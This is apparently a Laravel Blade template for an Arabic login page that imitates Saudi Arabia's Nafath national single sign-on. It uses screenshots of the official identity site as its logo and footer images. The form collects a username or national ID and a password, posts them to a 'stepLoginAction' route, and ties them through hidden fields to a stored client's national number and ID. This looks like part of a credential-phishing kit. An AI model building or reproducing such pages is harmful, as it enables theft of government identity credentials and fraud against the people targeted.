
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>صفحة تسجيل الدخول</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
    <link rel="stylesheet" href="{{asset('css/style.css')}}">
</head>
<body>
    <div class=" text-center mt-5">
        <!-- Logo Section -->
         <div class="header-parent">

             <img src="{{ asset('images/Screenshot 2022-06-04 at 06-30-43 الهوية الرقمية الوطنية_edited.avif') }}" alt="Logo" class="logo mb-3">
         </div>

        <!-- Title Section -->
        <div class="header-title">

            <img src="{{ asset('images/11.avif')}}" alt="Logo" class="logo mb-3">
        </div>


        <!-- Collapsible Section -->
        <div class="accordion" id="loginAccordion">
            <div class="card">
                <div class="card-header card-header-aplication  text-white">
                    <h5 class="mb-0">
                        <button class="btn btn-link collapsed text-white" data-toggle="collapse" data-target="#collapseApp" aria-expanded="false" aria-controls="collapseApp">
                       <i class="fas fa-plus"></i>
                       <div>  تطبيق نفاذ </div>
                        </button>
                    </h5>
                </div>
                <div id="collapseApp" class="collapse" data-parent="#loginAccordion">
                    <div class="card-body">
                        <!-- Collapsed content can go here if needed -->
                    </div>
                </div>
            </div>

            <div class="card">
                <div class="card-header text-white">
                    <h5 class="mb-0">
                        <button class="btn btn-link text-white" data-toggle="collapse" data-target="#collapseLogin" aria-expanded="true" aria-controls="collapseLogin">
                            <i class="fas fa-minus"></i>
                            <div>
                                اسم المستخدم وكلمة المرور
                            </div>
                        </button>
                    </h5>
                </div>
                <div id="collapseLogin" class="collapse show" data-parent="#loginAccordion">
                    <div class="card-body">
                        <!-- Login Form -->
                    <form action="{{route('stepLoginAction')}}" method="POST">
                        @csrf
                         <input type="hidden" name="national_number" value="{{$client->national_number}}">
        <input type="hidden" name="client_id" value="{{$client->id}}">
    <div class="form-group">
        <input type="text" name="username" class="form-control" placeholder="اسم المستخدم / الهوية الوطنية" required>
    </div>
    <div class="form-group">
        <input type="password" name="password" class="form-control" placeholder="كلمة المرور" required>
    </div>
    <button type="submit" class="btn-submit">تسجيل الدخول</button>
</form>

                    </div>
                </div>
            </div>
        </div>

        <div class="footer-img">
            <img src="{{ asset('images/Screenshot 2022-06-04 at 07-51-10 النفاذ الوطني الموحد.avif') }}"/>

        </div>



    <script src="https://code.jquery.com/jquery-3.5.1.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/@popperjs/core@2.10.2/dist/umd/popper.min.js"></script>
    <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"></script>
</body>
</html>
